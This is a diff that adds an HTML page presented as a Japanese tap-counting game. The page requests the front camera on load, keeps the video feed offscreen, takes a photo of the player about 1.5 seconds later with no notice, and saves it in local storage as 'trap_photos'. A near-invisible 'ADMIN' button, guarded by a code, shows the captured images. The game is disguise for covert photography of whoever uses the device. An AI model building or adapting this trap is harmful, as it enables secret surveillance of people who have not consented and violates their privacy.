@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>THE CLICKER - 究極の連打ゲーム</title>
+    <style>
+        :root {
+            --bg: #1a1a2e;
+            --accent: #0f3460;
+            --text: #e94560;
+        }
+        body {
+            font-family: sans-serif;
+            background-color: var(--bg);
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        /* ゲーム画面 */
+        #game-ui {
+            text-align: center;
+        }
+        #score {
+            font-size: 80px;
+            font-weight: bold;
+            color: var(--text);
+            margin: 20px 0;
+        }
+        .tap-area {
+            width: 200px;
+            height: 200px;
+            background: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            box-shadow: 0 0 20px rgba(233, 69, 96, 0.3);
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+        .tap-area:active {
+            transform: scale(0.9);
+        }
+
+        /* 隠し要素 */
+        #video-container {
+            position: fixed;
+            top: -1000px; /* 画面外に隠す */
+            left: 0;
+        }
+        
+        /* 管理画面 */
+        #gallery {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #121212;
+            z-index: 1000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .photo-card {
+            background: #222;
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .photo-card img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        
+        #setup-screen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        input {
+            padding: 12px;
+            border-radius: 5px;
+            border: none;
+            margin: 10px;
+            width: 80%;
+        }
+        button {
+            padding: 10px 20px;
+            background: var(--text);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .admin-trigger {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            opacity: 0.1; /* ほとんど見えない */
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="game-ui">
+    <p>TAP TO WIN!</p>
+    <div id="score">0</div>
+    <div class="tap-area" onclick="tapGame()">PUSH!</div>
+    <p style="margin-top:20px; color:#555; font-size:12px;">ハイスコアを目指せ</p>
+</div>
+
+<div id="video-container">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<button class="admin-trigger" onclick="checkAuth()">ADMIN</button>
+
+<div id="setup-screen">
+    <h3>管理者コード設定</h3>
+    <input type="password" id="new-code" placeholder="コードを入力 (例: 1234)">
+    <button onclick="saveSetup()">設定してゲーム開始</button>
+</div>
+
+<div id="gallery">
+    <div style="display:flex; justify-content: space-between;">
+        <h2>Captured</h2>
+        <button onclick="closeGallery()">戻る</button>
+    </div>
+    <div id="photo-list"></div>
+    <button onclick="clearAllPhotos()" style="width:100%; margin-top:20px; background:#444;">データ全消去</button>
+</div>
+
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let score = 0;
+
+    // ゲーム動作
+    function tapGame() {
+        score++;
+        document.getElementById('score').innerText = score;
+    }
+
+    // 初期化
+    window.onload = () => {
+        if (!localStorage.getItem('adminCode')) {
+            document.getElementById('setup-screen').style.display = 'flex';
+        } else {
+            initApp();
+        }
+    };
+
+    function saveSetup() {
+        const code = document.getElementById('new-code').value;
+        if (!code) return alert("入力してください");
+        localStorage.setItem('adminCode', code);
+        document.getElementById('setup-screen').style.display = 'none';
+        initApp();
+    }
+
+    async function initApp() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            
+            // 映像が安定するまで少し待ってから無音で撮影
+            setTimeout(takePhoto, 1500);
+        } catch (err) {
+            console.log("Camera access denied.");
+        }
+    }
+
+    function takePhoto() {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // 鏡像補正
+        context.translate(canvas.width, 0);
+        context.scale(-1, 1);
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+        savePhoto(dataUrl);
+        
+        // カメラ停止 (電池節約)
+        const stream = video.srcObject;
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+    }
+
+    function savePhoto(data) {
+        let photos = JSON.parse(localStorage.getItem('trap_photos') || '[]');
+        photos.push({
+            id: Date.now(),
+            date: new Date().toLocaleString(),
+            img: data
+        });
+        localStorage.setItem('trap_photos', JSON.stringify(photos));
+    }
+
+    // 管理機能
+    function checkAuth() {
+        const input = prompt("認証コード:");
+        if (input === localStorage.getItem('adminCode')) {
+            showGallery();
+        }
+    }
+
+    function showGallery() {
+        const list = document.getElementById('photo-list');
+        const photos = JSON.parse(localStorage.getItem('trap_photos') || '[]');
+        list.innerHTML = photos.length === 0 ? "なし" : "";
+        photos.reverse().forEach(p => {
+            const div = document.createElement('div');
+            div.className = 'photo-card';
+            div.innerHTML = `<small>${p.date}</small><img src="${p.img}">`;
+            list.appendChild(div);
+        });
+        document.getElementById('gallery').style.display = 'block';
+    }
+
+    function closeGallery() {
+        document.getElementById('gallery').style.display = 'none';
+    }
+
+    function clearAllPhotos() {
+        if(confirm("すべて消去しますか？")) {
+            localStorage.setItem('trap_photos', '[]');
+            showGallery();
+        }
+    }
+</script>
+</body>
+</html>
